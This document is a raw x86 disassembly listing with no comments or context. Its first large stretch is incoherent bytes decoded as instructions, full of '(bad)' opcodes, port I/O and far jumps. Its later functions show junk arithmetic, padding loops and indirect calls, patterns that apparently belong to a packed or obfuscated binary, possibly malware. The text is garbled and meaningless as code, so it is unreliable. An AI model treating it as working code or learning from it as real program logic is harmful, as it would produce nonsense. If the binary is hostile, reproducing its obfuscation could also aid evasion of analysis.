  41b010:	sub    BYTE PTR [ebp+0x29],al
  41b013:	ins    DWORD PTR es:[edi],dx
  41b014:	or     BYTE PTR [ecx+0xa68f2a9],0xdc
  41b01b:	(bad)  
  41b01c:	pop    edx
  41b01d:	(bad)  
  41b01f:	sar    DWORD PTR [esi-0x4f078eab],1
  41b025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b026:	sbb    ch,bh
  41b028:	in     al,dx
  41b029:	cmp    cl,cl
  41b02b:	aaa    
  41b02c:	jnp    0x41b00f
  41b02e:	(bad)  
  41b02f:	ins    BYTE PTR es:[edi],dx
  41b030:	icebp  
  41b031:	fcmovnbe st,st(4)
  41b033:	div    BYTE PTR [eax]
  41b035:	mov    DWORD PTR [eax],ecx
  41b037:	adc    ebx,ebp
  41b039:	or     ah,dh
  41b03b:	inc    edi
  41b03c:	mov    ds:0xfd1a2be3,al
  41b041:	out    dx,al
  41b042:	pop    ebp
  41b043:	loope  0x41b01e
  41b045:	imul   eax,DWORD PTR [esi-0x44b7ba5],0xc5824d43
  41b04f:	push   esp
  41b050:	call   0xa17e2344
  41b055:	add    BYTE PTR [ebp-0x66],dl
  41b058:	(bad)  
  41b059:	fisttp WORD PTR [esi-0x47b0e7f6]
  41b05f:	js     0x41b04f
  41b061:	inc    ebp
  41b062:	repnz aad 0x29
  41b065:	push   esi
  41b066:	lea    ebx,[edi+0x1c]
  41b069:	push   ebx
  41b06a:	ret    0xd323
  41b06d:	dec    ebx
  41b06e:	push   esp
  41b06f:	adc    al,0xe9
  41b071:	and    DWORD PTR [ebx],eax
  41b073:	stos   DWORD PTR es:[edi],eax
  41b074:	imul   edi,DWORD PTR [eax],0xd620ba4e
  41b07a:	imul   edx,DWORD PTR gs:[ebx+0xb3b7c76],0x6685bc27
  41b085:	and    cl,BYTE PTR [edi-0x28961ddd]
  41b08b:	fst    QWORD PTR [esi]
  41b08d:	lds    edi,FWORD PTR [edi]
  41b08f:	fisub  WORD PTR [ebp-0x31]
  41b092:	push   0x43
  41b094:	xchg   edx,eax
  41b095:	adc    eax,0xc74cd1d1
  41b09a:	nop
  41b09b:	scas   eax,DWORD PTR es:[edi]
  41b09c:	and    eax,0xae7df8f1
  41b0a1:	ja     0x41b0a9
  41b0a3:	jnp    0x41b103
  41b0a5:	fs inc ebx
  41b0a7:	jecxz  0x41b11e
  41b0a9:	mov    DWORD PTR [edi-0x4],edx
  41b0ac:	rcl    edi,cl
  41b0ae:	sbb    bh,al
  41b0b0:	pushf  
  41b0b1:	add    esi,DWORD PTR [edx-0x34]
  41b0b4:	outs   dx,BYTE PTR ds:[esi]
  41b0b5:	(bad)  [edi+0x5d5cd65d]
  41b0bb:	add    esi,esp
  41b0bd:	(bad)  
  41b0bf:	mov    DWORD PTR [edi-0x6d],eax
  41b0c2:	cmp    dh,bl
  41b0c4:	mov    ebp,0x63f6d3ef
  41b0ca:	push   ebp
  41b0cb:	shr    DWORD PTR [esi+0x6cd7697a],cl
  41b0d1:	mov    edi,0x91a86bf7
  41b0d6:	retf   0x6045
  41b0d9:	push   esi
  41b0da:	dec    ebx
  41b0db:	sti    
  41b0dc:	jne    0x41b122
  41b0de:	push   0xffffffe8
  41b0e0:	adc    al,0x57
  41b0e2:	cmp    al,0x28
  41b0e4:	cs mov ebx,0x9c74d8bc
  41b0ea:	retf   
  41b0eb:	mov    ds:0x563382fb,eax
  41b0f0:	pop    edi
  41b0f1:	or     ebx,DWORD PTR ds:0x36665270
  41b0f7:	in     eax,dx
  41b0f8:	push   edx
  41b0f9:	push   ebx
  41b0fa:	mov    ebp,DWORD PTR ds:0x8c0c0eb
  41b100:	pushf  
  41b101:	test   al,0xf6
  41b103:	pop    eax
  41b104:	call   0x86e2:0xb4cc75f6
  41b10b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b10c:	xchg   ecx,eax
  41b10d:	mov    ds:0x6ebdf9e9,eax
  41b112:	out    dx,al
  41b113:	and    eax,0x19cc278d
  41b118:	ins    BYTE PTR es:[edi],dx
  41b119:	mov    ds:0x1f58bdf7,al
  41b11e:	add    ecx,DWORD PTR [ecx+0x53407453]
  41b124:	add    al,0x72
  41b126:	enter  0xc512,0x96
  41b12a:	mov    edi,0xcf5ec073
  41b12f:	pop    ds
  41b130:	sbb    BYTE PTR [edi-0x4fb55131],al
  41b136:	(bad)  
  41b137:	fcom   QWORD PTR [ebx+eiz*8-0x6ad6aa56]
  41b13e:	imul   ebp,DWORD PTR [ecx+ecx*2],0x9b6c6ab0
  41b145:	jmp    0x41b0eb
  41b147:	xchg   ebx,eax
  41b148:	jns    0x41b1c3
  41b14a:	cmp    BYTE PTR [ebx],dl
  41b14c:	xlat   BYTE PTR ds:[ebx]
  41b14d:	fimul  DWORD PTR [ebx+0x1110ecef]
  41b153:	and    BYTE PTR [eax-0x1],dl
  41b156:	cmp    esp,DWORD PTR [eax+0x72390ee9]
  41b15c:	sbb    cl,0x78
  41b15f:	test   esp,ebp
  41b161:	ficomp DWORD PTR [edi]
  41b163:	xchg   esp,eax
  41b164:	cwde   
  41b165:	push   edi
  41b166:	fwait
  41b167:	cmp    BYTE PTR [edx+0x64],ah
  41b16a:	add    dh,BYTE PTR [edx-0x53]
  41b16d:	arpl   di,dx
  41b16f:	ror    BYTE PTR [ecx],0xeb
  41b172:	dec    ebx
  41b173:	and    al,BYTE PTR [esp+esi*4-0x5500c7fd]
  41b17a:	scas   eax,DWORD PTR es:[edi]
  41b17b:	mov    ah,0x63
  41b17d:	enter  0xc0d2,0x45
  41b181:	out    0x88,eax
  41b183:	cmovns ebx,DWORD PTR [edx]
  41b186:	int3   
  41b187:	sbb    ecx,DWORD PTR [edi+0x5e]
  41b18a:	jae    0x41b1e7
  41b18c:	mov    ds:0xa431430,eax
  41b191:	lahf   
  41b192:	rcr    BYTE PTR [ecx+0x27],1
  41b195:	int    0x8c
  41b197:	ret    0xa50c
  41b19a:	inc    edx
  41b19b:	cli    
  41b19c:	les    ecx,FWORD PTR [eax+0x2a1fc2d5]
  41b1a2:	cmp    esi,ebp
  41b1a4:	stos   DWORD PTR es:[edi],eax
  41b1a5:	mov    ch,0x59
  41b1a7:	dec    edx
  41b1a8:	aad    0xab
  41b1aa:	js     0x41b1b6
  41b1ac:	sbb    BYTE PTR [ecx],al
  41b1ae:	dec    ebx
  41b1af:	int    0xe
  41b1b1:	(bad)  
  41b1b2:	call   0xe31b3447
  41b1b7:	(bad)  
  41b1b8:	mov    bh,0x4f
  41b1ba:	sbb    ebp,eax
  41b1bc:	xchg   ebp,eax
  41b1bd:	fidiv  DWORD PTR [eax+0x524f649f]
  41b1c3:	push   0x2b
  41b1c5:	test   al,0x90
  41b1c7:	and    eax,0x640eecc8
  41b1cc:	imul   ecx,DWORD PTR [ebx+0x6768ee6d],0x97566d55
  41b1d6:	inc    esp
  41b1d7:	jb     0x41b1df
  41b1d9:	shr    al,cl
  41b1db:	enter  0x1682,0xb
  41b1df:	mov    eax,ds:0xbf2aae20
  41b1e4:	push   0x171b39da
  41b1e9:	jmp    0x41b267
  41b1eb:	dec    edx
  41b1ec:	retf   
  41b1ed:	xchg   ecx,eax
  41b1ee:	dec    eax
  41b1ef:	jno    0x41b18c
  41b1f1:	fwait
  41b1f2:	sbb    DWORD PTR [ecx],esp
  41b1f4:	(bad)  
  41b1f5:	xor    eax,0xea822b34
  41b1fa:	and    dh,ch
  41b1fc:	loope  0x41b1ae
  41b1fe:	gs lahf 
  41b200:	mov    esp,0xf3be59e0
  41b205:	sahf   
  41b206:	sub    al,0x83
  41b208:	leave  
  41b209:	adc    ecx,DWORD PTR [ebx]
  41b20b:	cmp    BYTE PTR [ebp-0x12],0x4
  41b20f:	adc    edi,DWORD PTR [eax+eiz*2]
  41b212:	lea    esi,[ecx+0x19]
  41b215:	cmp    DWORD PTR [ebx+0x60ba8cfb],esi
  41b21b:	sub    eax,0x1099c7e
  41b220:	cdq    
  41b221:	jnp    0x41b292
  41b223:	jnp    0x41b281
  41b225:	fst    QWORD PTR [ebp+0x2ae95694]
  41b22b:	sbb    al,ah
  41b22d:	push   ebx
  41b22e:	pop    ebx
  41b22f:	out    dx,eax
  41b230:	enter  0x518d,0x37
  41b234:	adc    al,0xe0
  41b236:	in     eax,dx
  41b237:	xchg   DWORD PTR [ebp+0x7130973c],eax
  41b23d:	fisttp QWORD PTR [ebp-0x4d38ca5b]
  41b243:	jg     0x41b282
  41b245:	push   edi
  41b246:	lds    ecx,FWORD PTR [ecx+0x26c3dbd9]
  41b24c:	dec    esi
  41b24d:	lahf   
  41b24e:	push   esi
  41b24f:	js     0x41b246
  41b251:	test   bl,dh
  41b253:	mov    al,0x85
  41b255:	jmp    0xb0b7:0x7ebeafac
  41b25c:	cmp    dh,dh
  41b25e:	inc    esp
  41b25f:	pop    es
  41b260:	push   ebx
  41b261:	sub    al,0xac
  41b263:	std    
  41b264:	pop    ecx
  41b265:	mov    ds:0xed1ffa7f,eax
  41b26a:	mov    ebx,0x22c37d91
  41b26f:	mov    cl,0x1b
  41b271:	push   ecx
  41b272:	jecxz  0x41b281
  41b274:	push   ds
  41b275:	es or  eax,0x134a9080
  41b27b:	mov    esi,0x41ae7513
  41b280:	mov    bl,0xa6
  41b282:	test   bh,bh
  41b284:	fcom   st(5)
  41b286:	fwait
  41b287:	rol    DWORD PTR [esi],1
  41b289:	sub    eax,0xd98ecd9b
  41b28e:	fiadd  DWORD PTR [esi]
  41b290:	cmp    ebx,DWORD PTR [edi+0x68]
  41b293:	mov    DWORD PTR [edi],ebp
  41b295:	jg     0x41b22e
  41b297:	cmp    edi,DWORD PTR [esi-0xc]
  41b29a:	mov    WORD PTR ss:[edi-0x6970fe68],cs
  41b2a1:	retf   
  41b2a2:	cmp    ebp,esi
  41b2a4:	cwde   
  41b2a5:	outs   dx,BYTE PTR ds:[esi]
  41b2a6:	lods   eax,DWORD PTR ds:[esi]
  41b2a7:	jp     0x41b2dc
  41b2a9:	mov    bl,0x28
  41b2ab:	inc    esp
  41b2ac:	fst    st(5)
  41b2ae:	rcl    BYTE PTR [edx],0x6b
  41b2b1:	push   cs
  41b2b2:	ror    DWORD PTR [ecx],1
  41b2b4:	(bad)  
  41b2b5:	ds in  al,dx
  41b2b7:	and    al,0xd
  41b2b9:	outs   dx,DWORD PTR ds:[esi]
  41b2ba:	jg     0x41b2b5
  41b2bc:	or     dh,BYTE PTR [esi+0x77]
  41b2bf:	test   al,0x3a
  41b2c1:	push   edi
  41b2c2:	inc    edx
  41b2c3:	fwait
  41b2c4:	and    cl,dl
  41b2c6:	xchg   ebx,eax
  41b2c7:	rcl    DWORD PTR [eax],0xf
  41b2ca:	sub    DWORD PTR ds:0xadef975a,ebp
  41b2d0:	scas   al,BYTE PTR es:[edi]
  41b2d1:	sbb    al,0xbd
  41b2d3:	push   es
  41b2d4:	shl    BYTE PTR ds:0x265ac6d9,1
  41b2da:	lods   eax,DWORD PTR ds:[esi]
  41b2db:	pop    es
  41b2dc:	and    dl,dl
  41b2de:	mov    al,0xc
  41b2e0:	xchg   edi,eax
  41b2e1:	hlt    
  41b2e2:	cmc    
  41b2e3:	sub    dl,BYTE PTR [ebp-0x49]
  41b2e6:	ss push esp
  41b2e8:	inc    esp
  41b2e9:	jb     0x41b28b
  41b2eb:	push   esi
  41b2ec:	jg     0x41b310
  41b2ee:	xor    bl,BYTE PTR [ecx-0x4957a087]
  41b2f4:	ss pop sp
  41b2f7:	or     al,0xa5
  41b2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2fa:	push   0xfc2b5773
  41b2ff:	or     DWORD PTR [esi],edx
  41b301:	icebp  
  41b302:	call   0xf506dba0
  41b307:	jmp    0x1bae:0x511caf73
  41b30e:	jmp    0xa0ac99f1
  41b313:	dec    edx
  41b314:	aaa    
  41b315:	mov    ah,0xe6
  41b317:	in     al,0x9
  41b319:	inc    eax
  41b31a:	inc    esp
  41b31b:	push   es
  41b31c:	retf   
  41b31d:	add    BYTE PTR [edi],0x5d
  41b320:	(bad)  
  41b321:	addr16 mov al,0x53
  41b324:	das    
  41b325:	mov    edi,0xfcee2b6b
  41b32a:	cli    
  41b32b:	inc    esi
  41b32c:	xchg   DWORD PTR [esi],esi
  41b32e:	(bad)  
  41b32f:	(bad)  
  41b331:	xchg   ebx,eax
  41b332:	jbe    0x41b35b
  41b334:	popf   
  41b335:	xor    BYTE PTR ds:0xa8134879,cl
  41b33b:	adc    ebx,ebx
  41b33d:	fnstcw WORD PTR [ebp-0x4dbd90fc]
  41b343:	int    0xe8
  41b345:	mov    dh,0xa
  41b347:	int    0xbf
  41b349:	xchg   edx,eax
  41b34a:	iret   
  41b34b:	ja     0x41b3c6
  41b34d:	xchg   esp,eax
  41b34e:	inc    ebp
  41b34f:	jbe    0x41b39c
  41b351:	cmp    al,0xc4
  41b353:	mov    esp,0x4bc8a557
  41b358:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b359:	add    dl,0x13
  41b35c:	mov    bl,0x8
  41b35e:	xlat   BYTE PTR ds:[ebx]
  41b35f:	push   edi
  41b360:	adc    DWORD PTR [eax],ecx
  41b362:	pop    ds
  41b363:	xchg   ebx,eax
  41b364:	mov    al,0xd9
  41b366:	mov    edx,0x890e63ed
  41b36b:	xchg   ebp,eax
  41b36c:	inc    ebp
  41b36d:	test   eax,0xfc29ee13
  41b372:	xchg   BYTE PTR [ecx-0x21a5454f],cl
  41b378:	sbb    esi,DWORD PTR [ecx-0x21291261]
  41b37e:	pop    es
  41b37f:	(bad)  
  41b380:	jecxz  0x41b3c6
  41b382:	and    BYTE PTR [ebx+0x7fb3f6a],dl
  41b388:	int3   
  41b389:	in     al,dx
  41b38a:	mov    eax,0x3b44b551
  41b38f:	in     eax,dx
  41b390:	test   al,0x21
  41b392:	cwde   
  41b393:	inc    edx
  41b394:	mov    bl,0x28
  41b396:	test   al,0xfa
  41b398:	std    
  41b399:	ret    0x4720
  41b39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b39d:	sbb    DWORD PTR [edi-0x67db363],0x82267133
  41b3a7:	mov    dh,0x28
  41b3a9:	shr    DWORD PTR ds:0xe6f00c1,cl
  41b3af:	cmp    esp,DWORD PTR [ebx+0x7c330782]
  41b3b5:	imul   ebp,ebx,0xef75b2b1
  41b3bb:	xchg   ebp,eax
  41b3bc:	scas   eax,DWORD PTR es:[edi]
  41b3bd:	push   cs
  41b3be:	sub    bh,BYTE PTR [ebp-0xcb0264f]
  41b3c4:	jl     0x41b3ba
  41b3c6:	data16 cmp BYTE PTR [eax+0x54710ecc],ch
  41b3cd:	or     esi,DWORD PTR [esi-0x44]
  41b3d0:	add    bl,bh
  41b3d2:	pop    esp
  41b3d3:	bound  eax,QWORD PTR [edx+0x3cd87418]
  41b3d9:	xor    al,BYTE PTR [ecx]
  41b3db:	scas   eax,DWORD PTR es:[edi]
  41b3dc:	aas    
  41b3dd:	ret    
  41b3de:	stos   BYTE PTR es:[edi],al
  41b3df:	lods   al,BYTE PTR ds:[esi]
  41b3e0:	xchg   DWORD PTR [esi+edx*4+0x3d],esp
  41b3e4:	push   eax
  41b3e5:	jbe    0x41b439
  41b3e7:	scas   al,BYTE PTR es:[edi]
  41b3e8:	ins    DWORD PTR es:[edi],dx
  41b3e9:	xor    eax,0x987d1693
  41b3ee:	(bad)  
  41b3ef:	sub    bh,BYTE PTR [esi-0xd2d7ea]
  41b3f5:	iret   
  41b3f6:	gs dec esi
  41b3f8:	xor    eax,0xa3ec1be7
  41b3fd:	mov    WORD PTR [ebx-0x1b519186],fs
  41b403:	mov    edi,0x624c5a60
  41b408:	mov    eax,0x3eae4030
  41b40d:	xchg   esi,eax
  41b40e:	mov    dh,0xb7
  41b410:	and    ah,BYTE PTR [eax]
  41b412:	and    eax,0xbdbc968b
  41b417:	mov    al,BYTE PTR [ebx+ecx*8+0x3166148b]
  41b41e:	in     eax,0xf9
  41b420:	sub    edi,DWORD PTR [ebx+edi*4-0x52660502]
  41b427:	xchg   ecx,eax
  41b428:	fs xchg ebp,eax
  41b42a:	dec    esi
  41b42b:	cdq    
  41b42c:	ins    DWORD PTR es:[edi],dx
  41b42d:	loope  0x41b3f4
  41b42f:	add    eax,0xf50071e5
  41b434:	sbb    al,BYTE PTR [esp+edi*4]
  41b437:	es out dx,eax
  41b439:	dec    ebx
  41b43a:	jmp    0x1664:0xa64c8936
  41b441:	lock in al,dx
  41b443:	add    eax,0xae7f7f89
  41b448:	dec    ebx
  41b449:	xchg   ecx,ebp
  41b44b:	jns    0x41b434
  41b44d:	inc    esi
  41b44e:	jns    0x41b435
  41b450:	jb     0x41b4af
  41b452:	cmp    ch,BYTE PTR [edx-0x9]
  41b455:	ja     0x41b463
  41b457:	int3   
  41b458:	mov    dl,0x67
  41b45a:	adc    ah,ch
  41b45c:	sbb    cl,BYTE PTR [esi-0x6fccc94]
  41b462:	js     0x41b4b7
  41b464:	adc    al,0xb1
  41b466:	cld    
  41b467:	pop    es
  41b468:	xchg   BYTE PTR [edi+ebp*1],bl
  41b46b:	mov    edi,0xbee59e4f
  41b470:	xchg   DWORD PTR [ebx],edi
  41b472:	out    dx,al
  41b473:	out    0x1d,eax
  41b475:	push   edi
  41b476:	xchg   ecx,eax
  41b477:	sub    bh,bh
  41b479:	pop    eax
  41b47a:	bound  eax,QWORD PTR [ebx+0x1d76c9a6]
  41b480:	daa    
  41b481:	outs   dx,BYTE PTR cs:[esi]
  41b483:	cs ds pop eax
  41b486:	arpl   WORD PTR [edx-0x22d166d8],ax
  41b48c:	xor    BYTE PTR [ebp-0x6e1529ca],al
  41b492:	xchg   edx,eax
  41b493:	add    al,0x5a
  41b495:	sub    ch,cl
  41b497:	mov    ecx,0xa17d6b44
  41b49c:	fsubr  st,st(0)
  41b49e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b49f:	fmul   DWORD PTR [ecx-0x1af52b77]
  41b4a5:	mov    ds:0x693bc24c,al
  41b4aa:	mov    edi,0xa5a0f9c2
  41b4af:	test   al,0xed
  41b4b1:	pop    eax
  41b4b2:	ins    DWORD PTR es:[edi],dx
  41b4b3:	and    al,0x25
  41b4b5:	xor    DWORD PTR [edx+0x11b727fa],esp
  41b4bb:	pop    es
  41b4bc:	mov    dl,0x55
  41b4be:	pop    edi
  41b4bf:	lds    eax,FWORD PTR [edi]
  41b4c1:	dec    ebx
  41b4c2:	add    al,0x98
  41b4c4:	daa    
  41b4c5:	arpl   WORD PTR [edi+eiz*8+0x41],ax
  41b4c9:	inc    edi
  41b4ca:	jnp    0x41b4c5
  41b4cc:	jge    0x41b528
  41b4ce:	daa    
  41b4cf:	pop    edx
  41b4d0:	loopne 0x41b49c
  41b4d2:	jmp    0x16b44577
  41b4d7:	cld    
  41b4d8:	int3   
  41b4d9:	inc    esp
  41b4da:	cmc    
  41b4db:	cld    
  41b4dc:	lahf   
  41b4dd:	jnp    0x41b53a
  41b4df:	mov    eax,0xd4f62b
  41b4e4:	adc    ebp,esp
  41b4e6:	in     eax,0x11
  41b4e8:	ins    DWORD PTR es:[edi],dx
  41b4e9:	jecxz  0x41b51b
  41b4eb:	inc    ebx
  41b4ec:	pop    ebx
  41b4ed:	jl     0x41b521
  41b4ef:	daa    
  41b4f0:	out    0x3c,al
  41b4f2:	aaa    
  41b4f3:	mov    ebp,0xade34f23
  41b4f8:	and    DWORD PTR [ebp-0x20],esp
  41b4fb:	fdiv   DWORD PTR [ecx-0xccdb2b0]
  41b501:	daa    
  41b502:	push   ebx
  41b503:	cmp    al,0x14
  41b505:	fmul   QWORD PTR [ecx-0x9]
  41b508:	push   ebp
  41b509:	or     BYTE PTR [ebp-0x1602cd78],cl
  41b50f:	mov    bl,0x3a
  41b511:	das    
  41b512:	out    0x9d,al
  41b514:	(bad)  
  41b515:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b516:	pushf  
  41b517:	sti    
  41b518:	test   DWORD PTR [eax+0x43],ecx
  41b51b:	addr16 fs test al,0x56
  41b51f:	adc    al,0x1c
  41b521:	shr    DWORD PTR ds:0x71acad12,cl
  41b527:	xchg   DWORD PTR [esp+eiz*4],edi
  41b52a:	and    eax,0x2dcfb07
  41b52f:	aas    
  41b530:	loop   0x41b54e
  41b532:	std    
  41b533:	jbe    0x41b526
  41b535:	mov    ch,0x44
  41b537:	or     ebp,DWORD PTR [edx+eiz*4-0x16]
  41b53b:	cli    
  41b53c:	aam    0x96
  41b53e:	xchg   ebx,eax
  41b53f:	(bad)  
  41b540:	and    eax,DWORD PTR [esi+0x2a0b0df]
  41b546:	retf   0x5db0
  41b549:	ja     0x41b5ba
  41b54b:	xchg   edx,eax
  41b54c:	xchg   ebx,eax
  41b54d:	jmp    0xcb56:0x3e0132a8
  41b554:	leave  
  41b555:	out    dx,eax
  41b556:	pop    ebp
  41b557:	dec    ebx
  41b558:	inc    esp
  41b559:	or     ch,BYTE PTR [ebp-0x3dde3730]
  41b55f:	jns    0x41b5a6
  41b561:	test   eax,0xf1f80daf
  41b566:	dec    esi
  41b567:	punpckhwd mm7,mm7
  41b56a:	test   DWORD PTR [ebp-0xb],esi
  41b56d:	rol    BYTE PTR [eax-0x57],0xdb
  41b571:	pop    esp
  41b572:	retf   
  41b573:	xor    eax,0x320fa59e
  41b578:	scas   eax,DWORD PTR es:[edi]
  41b579:	inc    edx
  41b57a:	mov    bl,0x7a
  41b57c:	mov    ecx,0xdefee652
  41b581:	mov    bl,0xd7
  41b583:	xchg   ecx,eax
  41b584:	xor    al,dh
  41b586:	bound  ebp,QWORD PTR [ecx]
  41b588:	mov    al,0x87
  41b58a:	lahf   
  41b58b:	cmp    ebp,edx
  41b58d:	test   DWORD PTR [edx-0x3dc6c47a],0x65d06166
  41b597:	out    dx,eax
  41b598:	jb     0x41b557
  41b59a:	jp     0x41b5ff
  41b59c:	arpl   sp,dx
  41b59e:	add    DWORD PTR [ebp-0x4f],ecx
  41b5a1:	bound  esp,QWORD PTR [esi+0x63]
  41b5a4:	or     ecx,ebp
  41b5a6:	mov    ?,WORD PTR [ecx+0x7b92072a]
  41b5ac:	clc    
  41b5ad:	mov    WORD PTR [esi+0x77],ss
  41b5b0:	push   ecx
  41b5b1:	in     al,dx
  41b5b2:	sar    al,1
  41b5b4:	xor    al,0x58
  41b5b6:	sbb    DWORD PTR [ebx],eax
  41b5b8:	shl    DWORD PTR [ecx],1
  41b5ba:	jbe    0x41b550
  41b5bc:	dec    ebp
  41b5bd:	shl    BYTE PTR [ebx-0x1a20508],cl
  41b5c3:	arpl   WORD PTR [esi+0x3d],sp
  41b5c6:	push   0xffffffb9
  41b5c8:	sbb    DWORD PTR [edi+0x5d5b95cd],eax
  41b5ce:	jmp    0x41b621
  41b5d0:	mov    ss,WORD PTR [eax-0x1f43a18c]
  41b5d6:	mov    ?,ebx
  41b5d8:	aas    
  41b5d9:	mov    ebx,0xcbe13114
  41b5de:	not    esi
  41b5e0:	sahf   
  41b5e1:	add    ch,dh
  41b5e3:	mov    ds:0x7da57e96,al
  41b5e8:	mov    edx,0x910978d8
  41b5ed:	add    cl,BYTE PTR [esi+0x1458f8b]
  41b5f3:	stos   BYTE PTR es:[edi],al
  41b5f4:	pop    ebx
  41b5f5:	push   es
  41b5f6:	inc    ebx
  41b5f7:	sbb    al,0xdd
  41b5f9:	pop    ebx
  41b5fa:	dec    esi
  41b5fb:	sbb    al,0x12
  41b5fd:	iret   
  41b5fe:	push   0xf4ae9efb
  41b603:	xor    dl,BYTE PTR [edi+esi*8+0x5d]
  41b607:	(bad)  
  41b608:	mov    dh,0x8e
  41b60a:	xchg   esi,eax
  41b60b:	xchg   edi,eax
  41b60c:	out    0xa3,eax
  41b60e:	xlat   BYTE PTR fs:[ebx]
  41b610:	mov    ah,BYTE PTR [esi+edi*1-0x5a71ed8a]
  41b617:	mov    gs,WORD PTR [eax+0x49f2ee20]
  41b61d:	xchg   DWORD PTR [edi],ebx
  41b61f:	push   es
  41b620:	dec    ebx
  41b621:	lods   eax,DWORD PTR ds:[esi]
  41b622:	cmp    eax,0x73f6e6cc
  41b627:	mov    esi,0x273e7922
  41b62c:	sti    
  41b62d:	rol    DWORD PTR [edi+0x2781c93c],1
  41b633:	pop    esp
  41b634:	mov    esp,0x88ec7f85
  41b639:	sub    ah,BYTE PTR [edi-0x5d]
  41b63c:	push   ds
  41b63d:	in     eax,dx
  41b63e:	jg     0x41b66f
  41b640:	loop   0x41b691
  41b642:	xor    ecx,DWORD PTR [ebx-0x3e7e4fab]
  41b648:	int    0xeb
  41b64a:	inc    edx
  41b64b:	add    dh,BYTE PTR [ebx]
  41b64d:	retf   0x4d89
  41b650:	mov    al,0x8b
  41b652:	dec    ebp
  41b653:	or     BYTE PTR [ebx-0x30fc4bab],cl
  41b659:	and    ecx,edx
  41b65b:	mov    DWORD PTR [ebp-0x4c],ecx
  41b65e:	mov    ecx,DWORD PTR [ebp+0x8]
  41b661:	mov    edx,DWORD PTR [ebp-0x48]
  41b664:	lea    ecx,[edx+ecx*1+0x241fcdf]
  41b66b:	mov    DWORD PTR [ebp-0x48],ecx
  41b66e:	mov    ecx,DWORD PTR [ebp+0x8]
  41b671:	mov    edx,0xfa5e1528
  41b676:	sub    edx,ecx
  41b678:	add    edx,DWORD PTR [ebp-0x44]
  41b67b:	mov    DWORD PTR [ebp-0x44],edx
  41b67e:	mov    ecx,DWORD PTR [ebp+0x8]
  41b681:	xor    ecx,eax
  41b683:	add    ecx,esi
  41b685:	jne    0x414b6f
  41b68b:	mov    ecx,DWORD PTR [ebp-0x8]
  41b68e:	xor    ecx,eax
  41b690:	mov    eax,DWORD PTR [ebp+0x10]
  41b693:	add    ecx,esi
  41b695:	mov    DWORD PTR [eax],ecx
  41b697:	pop    edi
  41b698:	pop    esi
  41b699:	pop    ebx
  41b69a:	leave  
  41b69b:	ret    0xc
  41b69e:	push   ebp
  41b69f:	mov    ebp,esp
  41b6a1:	sub    esp,0x78
  41b6a4:	not    DWORD PTR ds:0x4291f7
  41b6aa:	push   esi
  41b6ab:	sub    eax,ecx
  41b6ad:	push   edi
  41b6ae:	sub    eax,esi
  41b6b0:	mov    eax,ds:0x42830b
  41b6b5:	mov    DWORD PTR [ebp-0x24],eax
  41b6b8:	mov    eax,ds:0x42842b
  41b6bd:	inc    ecx
  41b6be:	mov    DWORD PTR [ebp-0x30],eax
  41b6c1:	or     DWORD PTR ds:0x42919f,edi
  41b6c7:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  41b6ce:	movzx  edi,BYTE PTR ds:0x42918f
  41b6d5:	adc    DWORD PTR ds:0x42914b,edi
  41b6db:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  41b6e2:	adc    DWORD PTR ds:0x42918f,edx
  41b6e8:	mov    eax,DWORD PTR [ebp-0x10]
  41b6eb:	add    DWORD PTR ds:0x4291f3,ecx
  41b6f1:	mov    ecx,DWORD PTR [ebp-0x10]
  41b6f4:	adc    DWORD PTR ds:0x42915f,0x287e
  41b6fe:	sub    eax,ecx
  41b700:	adc    esi,esi
  41b702:	mov    DWORD PTR [ebp-0x10],eax
  41b705:	xor    DWORD PTR [ebp-0x10],0xf89cb5a1
  41b70c:	xor    DWORD PTR ds:0x4291ab,0x51ed
  41b716:	mov    eax,DWORD PTR [ebp-0x18]
  41b719:	and    DWORD PTR ds:0x4291a3,0x0
  41b723:	mov    edi,DWORD PTR ds:0x4291a3
  41b729:	inc    edi
  41b72a:	mov    DWORD PTR ds:0x4291a3,edi
  41b730:	cmp    DWORD PTR ds:0x4291a3,0x1b
  41b737:	jle    0x41b760
  41b73d:	jmp    0x41b753
  41b742:	push   0x4280d6
  41b747:	push   DWORD PTR [ebp-0x18]
  41b74a:	push   DWORD PTR [ebp-0x14]
  41b74d:	call   DWORD PTR ds:0x42a7af
  41b753:	cmp    DWORD PTR ds:0x4291a3,0x12
  41b75a:	jb     0x41b723
  41b760:	mov    ecx,DWORD PTR [ebp-0x18]
  41b763:	sub    eax,ecx
  41b765:	mov    DWORD PTR [ebp-0x18],eax
  41b768:	or     DWORD PTR [ebp-0x18],0xf89f05a1
  41b76f:	mov    eax,DWORD PTR [ebp-0xc]
  41b772:	and    DWORD PTR ds:0x42919f,0x1b88
  41b77c:	mov    ecx,DWORD PTR [ebp-0xc]
  41b77f:	sub    eax,ecx
  41b781:	and    DWORD PTR ds:0x429173,0x0
  41b78b:	mov    ecx,DWORD PTR ds:0x429173
  41b791:	inc    ecx
  41b792:	mov    DWORD PTR ds:0x429173,ecx
  41b798:	cmp    DWORD PTR ds:0x429173,0x1b
  41b79f:	jg     0x41b7c2
  41b7a5:	jmp    0x41b7b5
  41b7aa:	push   0x3a78
  41b7af:	call   DWORD PTR ds:0x42a7b3
  41b7b5:	cmp    DWORD PTR ds:0x429173,0x15
  41b7bc:	jb     0x41b78b
  41b7c2:	mov    DWORD PTR [ebp-0xc],eax
  41b7c5:	xor    DWORD PTR ds:0x4291a7,0x3902
  41b7cf:	or     DWORD PTR [ebp-0xc],0xf89c85e1
  41b7d6:	mov    eax,DWORD PTR [ebp-0x1c]
  41b7d9:	and    DWORD PTR ds:0x4291f7,0x5581
  41b7e3:	mov    ecx,DWORD PTR [ebp-0x1c]
  41b7e6:	and    DWORD PTR ds:0x42914b,0x0
  41b7f0:	mov    esi,DWORD PTR ds:0x42914b
  41b7f6:	inc    esi
  41b7f7:	mov    DWORD PTR ds:0x42914b,esi
  41b7fd:	cmp    DWORD PTR ds:0x42914b,0xc
  41b804:	jg     0x41b848
  41b80a:	jmp    0x41b821
  41b80f:	push   0x428010
  41b814:	push   0x0
  41b816:	push   0x6059
